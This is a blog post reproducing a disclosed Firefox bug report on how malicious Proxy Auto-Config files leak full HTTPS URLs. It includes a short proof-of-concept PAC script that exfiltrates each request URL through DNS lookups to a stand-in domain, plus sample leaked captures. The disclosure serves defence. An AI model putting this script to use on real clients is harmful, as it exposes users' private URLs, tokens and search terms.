---
layout: post
title: Firefox - Proxy Auto-Config SSL/TLS Url Disclosure
category: bugreports
---

Malicious Proxy Auto-Config (PAC) files allow for the disclosure of SSL/TLS encrypted HTTPS request URLs (including full paths and query strings) from Firefox.

<!--more-->

*Original bug report can be viewed at [https://bugzilla.mozilla.org/show_bug.cgi?id=1255474](https://bugzilla.mozilla.org/show_bug.cgi?id=1255474)*

<pre class="bugreport">
Description:        Proxy Auto-Config SSL/TLS Url Disclosure
Versions Affected:  All
Category:           Information Disclosure
Reporter:           Alex Chapman and Paul Stone of Context Information Security

Summary:
--------
Malicious Proxy Auto-Config (PAC) files allow for the disclosure of SSL/TLS encrypted HTTPS request URLs (including full paths and query strings) from Firefox. The PAC file specifies a Javascript function, FindProxyForURL(url, host), which is called for each URL request in order to determine the required proxy for the connection. This function receives the full URL and hostname for both HTTP and HTTPS requests, which can be leaked by a malicious PAC script. This could expose credentials, tokens, search terms or any other data passed in HTTPS URL query strings to internet based attackers that would otherwise be encrypted. This issue does not affect the default configuration of Firefox.

Analysis:
---------
The PAC file is executed in a limited, sandboxed Javascript environment, but some functions are still available (see http://findproxyforurl.com/pac-functions/), most notably dnsResolve. This allows for the full request URL from affected clients to be leaked to an attacker's DNS server or local network hosts via LLMNR.

Since PAC files must be specified manually (either in Firefox or in the system proxy settings), this issue would require a network-based attacker to be able to intercept network traffic of a client configured with a PAC file. For example, this could be performed by a malicious gateway.

All software that implements the PAC specification as written is affected by this issue. We have has confirmed this issue in a number of browsers and operating systems. Notably however, Internet Explorer does not leak full URLs, instead passing only the protocol and hostname to the 'url' parameter of FindProxyForURL (e.g. https://www.example.com/, not https://www.example.com/index.html?foo=bar). Therefore a possible fix for this issues is to follow this same behaviour.

Proof of Concept:
-----------------
A PAC script can be crafted, as below, which will perform a DNS lookup based on the host and url parameters passed into the function:

  function FindProxyForURL(url, host){
    if (dnsResolve((url+'.example.com').replace(/[^a-z0-9_-]+/gi,'.')))
      return "DIRECT";
    return "DIRECT";
  }

This will perform DNS lookups with the encoded URLs against the example.com DNS server.

See the following example DNS captures from HTTPS requests:

  https.incoming.telemetry.mozilla.org.submit.telemetry.0b2fe929-bff9-4421-9a77-9247930853db.main.Firefox.44.0.2.release.20160210153822.v.4.example.com.
  https.www.google.com.complete.search.client.firefox.q.secre.example.com.
  https.www.google.com.complete.search.client.firefox.q.secret.example.com.
</pre>
